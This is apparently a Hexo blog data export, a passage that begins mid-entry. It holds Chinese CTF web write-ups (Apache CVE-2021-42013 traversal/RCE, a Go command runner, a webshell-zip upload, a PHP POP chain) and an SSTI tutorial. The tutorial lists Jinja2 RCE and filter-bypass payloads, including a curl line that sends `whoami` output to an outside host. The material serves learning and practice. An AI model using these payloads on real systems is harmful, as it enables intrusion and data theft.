src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182848657-222743158.png\" width=\"200\">\n只能说“黔驴技穷”。之后查找师傅们的wp和网上的各种资料，得知**Apache/2.4.50 (Unix)**版本存在任意路径穿越漏洞（这时再回想起一开始的那一行路径，或许也是在提示这一点罢）。\n[ [Apache 远程代码执行（CVE-2021-42013）](https://github.com/asaotomo/CVE-2021-42013-Apache-RCE-Poc-Exp)]\n直接找到CVE，用poc和exp去打\n> //查看任意文件\n`GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1`\n\n(若将`etc/passwd`改为`flag`，则可读取到flag，不过是假的，我们后面再看)\n> //执行任意命令\n`GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1`\n\n我们利用exp和Burp Suite发送命令\n`echo Content-Type: text/plain; echo;ls /\n//这里的Content-Type: text/plain 规定将文件设置为纯文本的形式`\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184819761-451478684.png\" width=500>\n\n从而查看到所有的文件名，在其中发现flag，试图`echo;cat /flag`读取\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184950024-333636240.png\" width=500>\n结果发现为假，只能从其他的文件下手，这里凭运气选一个最奇怪的`diajgk`，然后一层层查看，最终在第四层发现一个貌似flag的文件，cat读取得到flag\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185335437-2104134847.png\" width=500>\n***\n这一题有三个问题在耗费了大量的时间，需要找时间再去理解清晰：\n1、在找flag的点上存在一些问题，如果要一个个去把文件都试一遍未免过于离谱。在找办法的过程中发现一位师傅通过分析查看日志的办法找到最终真正的flag的路径，不过因为不知道其使用了怎么样的命令而无法复现（点击图片可跳转到这位师傅的博客）\n[<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185839323-780544381.png\" width=500>](https://blog.csdn.net/RABCDXB/article/details/124994738)\n2、如何运用该exp去执行更多其他的命令，有何规范？（我自己尝试的cd、tail等均无效）\n3、echo有什么作用，与分号联合怎样使用？\n***\n***\n\n# hackme\n\n这题不出意外的没有什么思路，发现**GOTOLIST**是可以点击的链接，里面又有8个链接，一个个点进去，没有头绪，奇怪的是users点进去出现了这样一句：\n> Sorry there doesn't seem to be a users.go file\n\n又结合最后一个链接——上传一个**.go**文件，猜测需要用该链接上传一个名叫**users.go**的go文件，然后点击users执行文件。然而博主并不知道什么是go文件，也不知道怎么用，继续懵逼着去翻大佬们的wp，得知可以找到执行命令的go脚本 [os/exec 执行命令的五种姿势](https://golang.iswbm.com/c05/c05_02.html)！\n\n选择执行命令并且能获取结果的办法\n\n```\npackage main\n\nimport (\n\"fmt\"\n\"log\"\n\"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"ls\",\"/\")\n    out, err := cmd.CombinedOutput()\n    if err != nil {\n        fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n        log.Fatalf(\"cmd.Run() failed with %s\\n\", err)\n    }\n    fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n}\n```\n\n发现成功执行了`ls /`命令\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203359350-1628717592.png)\n且成功找到了藏起来的flag，将`cmd := exec.Command(\"ls\",\"/\")`更改为`cmd := exec.Command(\"cat\",\"/flag\")`\n![成功获取flag](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203655197-291459483.png)\n成功获取flag！\n\n***\n***\n\n# ezcms\n\n下载文件后，发现有`admin.php`文件\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818201224459-1716179419.png\" width=200>\n\n得知该网站存在后台，对文件全局搜索“密码”，碰巧发现\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818202107960-1160034001.png\" width=500>\n\n用`admin 123456`成功登入后台。逛了一圈，能点的都点了一遍，没发现什么可利用的信息。于是一个个翻看源码，可是博主不够敏锐，没能发现存在着`Update.php`可以上传文件，后来查看其他大佬的wp才回过神来：嗯，在admin文件夹里，确实应该再仔细看一看。\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203053359-275459141.png\" width=600>\n\n这段代码告诉我们，在这个页面，可以用`GET`方式传`url`值，然后该`url`经`sys_auth()`函数处理后就会被下载，判断`Content-Type`值为`application/zip`就会被解压，然后输出 `版本升级成功~`\n\n于是考虑`sys_auth()`函数作何用处——加密或解密\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203716598-553405938.png\" width=500>\n且可判断，当`type=0`时加密，传入`type=1`为解密。\n那么就思路便明确了，我们只需要在vps上部署一个“一句话木马”的压缩文件（.zip），得到`webshell.zip`的url，然后将该url用源码中的`sys_auth()`加密，最后以GET方式把加密后的url上传即可，具体实现如下：\n\n```\n<?php\ndefine('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');\n\n//字符加密、解密 [0为加密，1为解密]\nfunction sys_auth($string, $type = 0, $key = '', $expiry = 0) {\n\tif(is_array($string)) $string = json_encode($string);\n\tif($type == 1) $string = str_replace('-','+',$string);\n\t$ckey_length = 4;\n\t$key = md5($key ? $key : Mc_Encryption_Key);\n\t$keya = md5(substr($key, 0, 16));\n\t$keyb = md5(substr($key, 16, 16));\n\t$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\n\t$cryptkey = $keya.md5($keya.$keyc);\n\t$key_length = strlen($cryptkey);\n\t$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\n\t$string_length = strlen($string);\n\t$result = '';\n\t$box = range(0, 255);\n\t$rndkey = array();\n\tfor($i = 0; $i <= 255; $i++) {\n\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\n\t}\n\tfor($j = $i = 0; $i < 256; $i++) {\n\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\n\t\t$tmp = $box[$i];\n\t\t$box[$i] = $box[$j];\n\t\t$box[$j] = $tmp;\n\t}\n\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\n\t\t$a = ($a + 1) % 256;\n\t\t$j = ($j + $box[$a]) % 256;\n\t\t$tmp = $box[$a];\n\t\t$box[$a] = $box[$j];\n\t\t$box[$j] = $tmp;\n\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\n\t} \n\tif($type == 1) {\n\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\n\t\t\t$result = substr($result, 26);\n\t\t\t$json = json_decode($result,1);\n\t\t\tif(!is_numeric($result) && $json){\n\t\t\t\treturn $json;\n\t\t\t}else{\n\t\t\t\treturn $result;\n\t\t\t}\n\t\t}\n\t\treturn '';\n\t}\n\treturn str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));\n}\n//以下为利用源码函数进行sys加密\n$ans=sys_auth(\"http://ip.ip.ip.ip/acmd.zip\");//我上传的webshell压缩文件名为acmd.zip\nvar_dump($ans);\n\n?>\n```\n\n利用如上exp得到加密的url：\n> 事实上博主第一次失败了，发现原来代码里还存在着一个全局变量![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818204653057-598288141.png)\n跟踪查找即可以找到`define('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');`\n加上这句定义后成功\n\n`string(79) \"498bUpfpc2DVbWQdqxFIo8gRcC76FVJksWQcRwY5OCDSBXHMEF3zd07OYVMsJekRsip5UY2acffwS1Q\"`\n拿到加密url后直接上传：\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205303419-51425222.png\" width=500>\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205518891-1217499246.png\" width=500>\n\n成功！接下来，我便开始试图在`update.php`源码中找到文件下载或解压后所在的位置，此间跟踪了几个类、函数如`mczip->PclZip()`结果并没有分析出什么来，只得再去翻看其他师傅的wp，发现他们的后门就在根目录下，于是蚁剑🗡连接，flag还是在根目录下:\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818210721537-1371645933.png\" width=500>\n\n打开后成功得到flag`DASCTF{86527acc-676d-4267-a1a1-b46337a3a2a6}`\n***\n这题于我而言很扯淡的点就是vps部署和解压目录查找，一开始我脑子有点进淼竟然用本地的PHP study搭建的网站上传压缩包......结果当然就是失败，报错信息是`压缩包不zip类型文件`我直接傻掉，一直在想如何把压缩包的content type类型调成他要求的zip，完全忽略了他根本进不了我的本地站点...后来部署在vps上成功得以解决；至于第二点仍需要学习，希望**多指教**~","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF Sept X 浙江工业大学秋季挑战赛 web","url":"/2022/12/06/2022DASCTF-Sept-X-浙江工业大学秋季挑战赛-web/","content":"# hellounser\n直接可读源码\n```\n<?php\nclass A {\n    public $var;\n    public function show(){\n        echo $this->var;\n    }\n    public function __invoke(){\n        $this->show();\n    }\n}\n\nclass B{\n    public $func;\n    public $arg;\n    \n    public function show(){\n        $func = $this->func;\n        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this->arg)) { \n            die('No!No!No!'); \n        } else { \n            include \"flag.php\";\n            //There is no code to print flag in flag.php\n            $func('', $this->arg); \n        }\n    }\n    \n    public function __toString(){\n        $this->show();\n        return \"<br>\".\"Nice Job!!\".\"<br>\";\n    }\n    \n    \n}\n\nif(isset($_GET['pop'])){\n    $aaa = unserialize($_GET['pop']);\n    $aaa();\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n审计代码发现需要GET方式传入”pop”，然后经反序列化后被调用。\nA类中的`_invoke()`魔术方法能在A类被调用为函数时触发，从而调用`show()`函数，输出`$var`，而B类中的`_toString()`魔术方法能在B类被当作字符串使用时触发，若让`$var=B`类，则`_toString()`被触发时调用B的`show()`函数。\n查看B类中`show()`函数，`func`、`arg`被绕过后则可包含”flag.php”文件，注释中提到不会输出，便只能依赖`$func`函数——有两个参数，且能执行任意命令，可利用`cretae_function`，既绕过了`func`的匹配，又可以执行（这里需要用`}`闭合函数）。\n由此构造如下代码\n\n```\n$a=new A();\n$b=new B();\n\n$b->func=\"create_function\";\n$b->arg=\"}var_dump(get_defined_vars());//\";\n$a->var=$b;\n\necho urlencode(serialize($a));\n```\n\n传入`” cretae_function”`作为$函数名，然后将`\"}var_dump(get_defined_vars());//\"`传入`arg`，从而绕过了匹配并执行`$func('', $this->arg); `，相当于执行如下代码\n\n```\ncreate_function(\"\",}var_dump(get_defined_vars());//)\n也即--------->\ncfunction(\"\"){\n}var_dump(get_defined_vars());//}\n```\n\n这里的`var_dump()`函数可以输出变量的相关信息，显示关于一个或多个表达式的结构信息，包括表达式的类型与值（其中数组会递归展开值，通过缩进显示其结构）；而`get_defined_vars()`函数能返回由所有已定义变量所组成的数组，通过这两个函数能看到所有已定义变量。\n经以上代码执行便可得到序列化`$a`的url编码，传入后得到\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816220606569-998092554.png)\n发现真正的flag藏在一个叫Tru3flag.php的文件里，因此base64绕过后，用`require()`函数包含执行[或者cat查看用取反绕过的办法]\n`require(base64_decode(VHJ1M2ZsYWcucGhw));`\n修改后的完整代码如下\n\n```\nclass A {\n    public $var;\n    public function show(){\n        echo $this->var;\n    }\n    public function __invoke(){\n        $this->show();\n    }\n}\n\nclass B{\n    public $func;\n    public $arg;\n    \n    public function show(){\n        $func = $this->func;\n        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this->arg)) { \n            die('No!No!No!'); \n        } else { \n            include \"flag.php\";\n            //There is no code to print flag in flag.php\n            $func('', $this->arg); \n        }\n    }\n    \n    public function __toString(){\n        $this->show();  \n        return \"<br>\".\"Nice Job!!\".\"<br>\";\n    } \n}\n\n$a=new A();\n$b=new B();\n\n$b->func=\"create_function\";\n$b->arg=\"}require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//\";\n$a->var=$b;\n/*\ncreate_function(\"\",}var_dump(get_defined_vars());//)\n--------->\ncfunction(\"\"){\n}var_dump(get_defined_vars());//}\n*/\necho urlencode(serialize($a));\n?>\n```\n\n得到flag\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816221213537-1615985978.png)\n\n---\n附经常使用到的**魔术方法**\n（来自 [php反序列化漏洞之POP链构造](https://www.jianshu.com/p/7ec82ffc457d)）\n\n```\n__construct()  //当对象创建时触发\n__destruct()   //当对象销毁时触发\n__wakeup()     //当使用unserialize时触发\n__sleep()     //当使用serialize时触发\n__destruct()  //当对象被销毁时触发\n__call()      //当对象上下文中调用不可访问的方法时触发\n__get()       //当访问不可访问或不存在的属性时触发\n__set()       //当设置不可访问或不存在属性时触发\n__toString()  //当把类当作字符串使用时触发\n__invoke()    //当对象调用为函数时触发\n```","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"服务器端模板注入（SSTI）","url":"/2022/12/06/服务器端模板注入（SSTI）/","content":"# 一、SSTI简介\nSSTI， 即 **Server-Side Template Injection，服务器端模板注入**。\n\n## 1、SSTI产生原因\n在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给View ，这样就最终显示在我们的面前了，那么这里的 **View** 中就会大量地用到一种叫做**模板**的技术。\n绕过服务端接收了用户的恶意输入后，**未经任何处理**就将其作为web应用模板内容的一部分，而模板引擎在**进行目标编译渲染**的进程中，执行了用户恶意攻击者插入的可以破坏模板的语句，就会导致信息泄露、代码执行、GetShell等问题。\n>**网站模板引擎:**\n模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。\n模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。\n\n>现行的模板引擎有:\nPHP 的     Smarty, Twig, Blade.\nJava 的    JSP, FreeMareker, Velocity.\nPython 的  Flask(Jinja2), django, tornado\n\n......\n\n简单来说，可以理解为利用模板引擎来生成前端的HTML代码。模板引擎会会提供一套生成HTML代码的程序，然后只需要获取用户的数据，将其放到渲染函数里，最后生成模板+用户数据的前端HTML页面，反馈给浏览器，从而呈现在用户面前。当这里的“用户的数据”具有恶意攻击性而又不被处理时，SSTI就发生了。\n\n## 2、SSTI检测工具 Tplmap\n\n>工具地址:https://github.com/epinna/tplmap\n安装教程:https://www.cnblogs.com/ktsm/p/15691652.html\n使用教程：https://blog.csdn.net/EC_Carrot/article/details/109709767\n\n【参考资料：**[详解SSTI模板注入](https://blog.csdn.net/LYJ20010728/article/details/120205725)**】\n\n# 二、SSTI 利用\n>以Flask（Jinja2）为例（windows），该版块仅涉及主机上的python语法\n\n## Ⅰ. 基础知识\n### 1、Python 内建函数\n启动 python 解释器时，即使没有创建任何变量或函数还是会有很多函数可供使用，这些就是 python 的内建函数。在 Python 交互模式下，使用命令 `dir('builtins')` 即可查看当前 Python 版本的一些内建变量、内建函数，**内建函数可以调用一切函数**。\n### 2、Python 类继承\nPython 中一切皆为对象，均继承于 object 对象，Python 中的 object 类中集成了很多的基础函数，假如需要在 payload 中使用某个函数就需要用 object 去操作。\n\n常见的**继承关系**有以下三种：\n\n```\n1. base ：对象的一个基类，一般是object\n2. mro  ：获取对象的基类，只是这时会显示整个继承链的关系，是一个列表，而object在最列表的最顶层，通过mro[-1]可以获取到\n3. subclasses() : 继承此对象的子类，返回一个列表\n```\n\n## Ⅱ. 构造payload\n<br>\n\n**攻击方式为：变量->对象->基类->子类遍历->全局变量**\n\n### 1、相关属性\n\n```\n对于返回的是类实例：\n1. __class__            //返回实例的对象，可以使实例指向class，从而使用下面的魔术方法\n如：\n>>>''.__class__  \n<class 'str'>\n\n对于返回的是定义的class类：\n2. __base__              //返回类的父亲 python3\n3. __mro__               //返回类继承的元组，即寻找父类 python3\n4. __subclasses__()      //返回类中仍然可用的引用，可以此获取想要的类的对象 python3\n如：\n>>> ''.__class__.__mro__[-1].__subclasses__()[138]  \n<class 'os._wrap_close'>   \nTip：根据索引值来获取想用的可利用类,不加索引会输出全部存活的引用\n\n5. __builtins__          //作为默认初始模块出现，可用于查看当前所有导入的内建函数\n6. __globals__           //对包含函数全局变量的字典的引用。如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量 python3\n7. __init__              //返回类的初始化方法\n如：\n>>> ''.__class__.__bases__[0].__subclasses__()[38].__init__\n<slot wrapper '__init__' of 'object' objects>\nTip: 'wrapper'是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性\n```\n\n### 2、一个简单的payload寻找过程\n#### Ⅰ. 找到`__globals__`全局\n根据上述属性，找到重载过的 `__init__` 类（在获取初始化属性后，带 `wrapper` 的说明没有重载，因此寻找**`不带 warpper`** 的即可），并通过 `__globals__` 全局来查找所有的方法及变量及参数，或者获取 `file` 、 `os` 等模块以进行下一步的利用。\n\n```\n>>> ''.__class__.__bases__[0].__subclasses__()[138].__init__\n<function _wrap_close.__init__ at 0x0000025AA50BAEE0>\n```\n\n#### Ⅱ. 查看其引用`__builtins__`\n\n```\n''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']            \nTip：这里会返回 dict 类型，寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能\n```\n\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220915221230348-826204857.png)\n\n#### Ⅲ. 使用可利用函数实现文件读取功能等\n\n`''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()\n`\n### 3、常用的目标函数\n\n```\nfile\nsubprocess.Popen\nos.popen\nexec\neval\n```\n\n>几个含有`eval`函数的类：\nwarnings.catch_warnings\nWarningMessage\ncodecs.IncrementalEncoder\ncodecs.IncrementalDecoder\ncodecs.StreamReaderWriter\nos._wrap_close\nreprlib.Repr\nweakref.finalize\n......\n\n### 4、命令执行\nPython常用的三种**命令执行**方式：\n\n> `os.system()`\n该方法的参数就是 string 类型的命令，在 linux 上返回值为执行命令的 exit 值；而windows上返回值则是运行命令后 shell 的返回值；注意：该函数返回命令**执行结果的返回值**，并不是返回命令的执行输出（执行成功返回0，失败返回-1），因此需要配合 curl 外带数据查看回显          #这里画个问号 \n\n> `os.popen()`\n返回的是 file read 的对象，如果想获取执行命令的输出，则需要调用该对象的 read() 方法\n\n> 直接寻找 `os` 模块执行命令\n先编写脚本遍历Python中含有os模块的类的索引号，然后选取其中一个构造payload执行命令，脚本如下：\n```\nimport requests\n\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'\n}\n\nfor i in range(500):\n    url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\"\n\n    res = requests.get(url=url, headers=headers)\n    if 'os.py' in res.text:\n        print(i)\n```\n\n<br>\n\n用例:\n\n```\n''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\")\nTip: 需要导入os模块\n''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('dir').read()\")\nTip: 需要导入os模块\n\n''.__class__.__mro__[-1].__subclasses__()[79].__init__.__globals__['os'].popen('dir').read()\n```\n\n我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 `os._wrap_close`，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。\n<br>\n\n>事实上，在本地python环境下，可以直接在`os._wrap_close`找到popen函数：\n`''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read()`\n\n【参考资料：[以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用](https://xz.aliyun.com/t/9584#toc-17)】\n\n# 三、模板注入绕过\n## 1、语法\n官方文档对于模板的部分语法介绍如下（仍然以jinja2为例：[Template Designer Documentation](https://jinja.palletsprojects.com/en/2.11.x/templates/)）\n\n>1 基本语法\n```\n{% ... %} for Statements \n可用来声明变量，也可用以循环语句和条件语句\n{{ ... }} for Expressions to print to the template output\n用于将表达式打印到模板输出\n{# ... #} for Comments not included in the template output\n表示未包含在模板输出中的注释\n#  ... # for Line Statements\n## 可以有和 {%%} 相同的效果\n```\n>2 dot(.)的绕过\n```\nYou can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). --官方原文\n可以用 . 或者 [] 来访问变量的属性，也就是说\n{{\"\".__class__}}  等价于  {{\"\"['__classs__']}}\n```\n因此，当`.`被过滤时，我们可以使用`[]`以绕过。\n>3 如果想调用字典中的键值，其本质其实是调用了魔术方法`__getitem__`\n\n所以对于取**字典中键值**的情况不仅可以用`[]`，也可以用`__getitem__`\n```\n{{url_for.__globals__['__builtins__']}}\n{{url_for.__globals__.__getitem__('__builtins__')}}\n```\n>4 调用对象的方法，具体是调用了魔术方法`__getattribute__`\n```\n\"\".__class__\n\"\".__getattribute__(\"__class__\")\n```\n>5 **`lipsum`**\n**flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：**\n\n```\n{{lipsum.__globals__['os'].popen('ls').read()}}\n#在CTF中很好用\n```\n【参考资料：[SSTI](https://lazzzaro.github.io/2020/05/15/web-SSTI/)】\n## 2、绕过\n### Ⅰ. 字符串\n1、拼接\n```\"cla\"+\"ss\"```\n\n2、反转\n```\"__ssalc__\"[::-1]```\n\n3、编码绕过（ASCII码、Unicode编码等）\n4、利用chr函数\n因为我们没法直接使用chr函数，所以需要通过`__builtins__`找到他\n```\n{% set chr=url_for.__globals__['__builtins__'].chr %}\n{{\"\"[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}  //%2b为 + ，拼接字符串\n==>{{\"\".__class__}}\n```\n\n5、在jinja2里面可以利用`~`进行拼接\n```\n{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\n```\n\n6、大小写过滤转换\n### Ⅱ. 过滤器\n>在模板中, 过滤器相当于一个函数, 把当前的变量传入到过滤器中, 然后过滤器根据自身功能, 再返回对应的值, 之后再把结果渲染到页面中\n基本语法: `{{ 变量 | 过滤器名称 }} `使用管道符号`|`进行组合，可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。\n\n常用的过滤器：\n```\n1. attr\n#用于获取变量，可用于. [] 都被过滤的情况\n\"\"|attr(\"__class__\") <==> \"\".__class__\n2. format\n#格式化字符串\n\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)  \n<==>  \n\"__class__\"\n3. join\n#将一个序列拼接成一个字符串，join ('|')将令每一个元素被'|'隔开\n\"\"[['__clas','s__']|join] 或者 \"\"[('__clas','s__')|join]\n<==>\n\"\"[\"__class__\"]\n4. lower\n#转换成小写\n5. replace\n#替换字符串\n\"__claee__\"|replace(\"ee\",\"ss\") 构造出字符串 \"__class__\"\n\"__ssalc__\"|reverse 构造出 \"__class__\"\n6. string\n#将变量转换为字符串，这样就可以通过浏览器显示的符号构造出我们可利用的字符串、符号等\n().__class__   出来的是<class 'tuple'>\n().__class__|string)[0] 出来的是<\n7. list\n#转换成列表，可以与上面的string配合，就可以调用列表里面的方法取字符了\n(()|select|string|list).pop(0)\n```\n【资料查阅：[SSTI模板注入绕过（进阶篇）](https://blog.csdn.net/miuzzx/article/details/110220425)】\n### Ⅲ. 关键字绕过\n1. `.`和`[]`\n>可用过滤器`attr`绕过，若`.`可用，还可以`__getitem__`绕过`[]`。\n\n2. `\"\"`和`_`绕过\n>`request.args`、`request.values`、`request.cookies` 是 flask 中的属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来进而绕过了引号的过滤\n\n```\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd\n=>\n{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__\n```\n\n3. `{{}}`绕过\n>用`{%%}`的左半边绕过\n\n```{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami` ').read()=='p' %}1{% endif %}```\n\n# 四、SSTI检测\n## 1、Tplmap\n## 2、附表\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916005446865-111172183.png)\n使用标志测试。如jinja2：`{{7+8}}`，如果输出`15`，则有可能存在SSTI漏洞。\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916011329647-1428250087.png)\n<图源: https://www.cnblogs.com/icez/archive/2018/04/07/ssti_check_payload.html>","tags":["web","渗透","常见漏洞"],"categories":["渗透：从0到1"]},{"title":"Hello, Stuuupid","url":"/2022/12/05/Hello-Stuuupid/"},{"title":"Hello World","url":"/2022/12/04/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]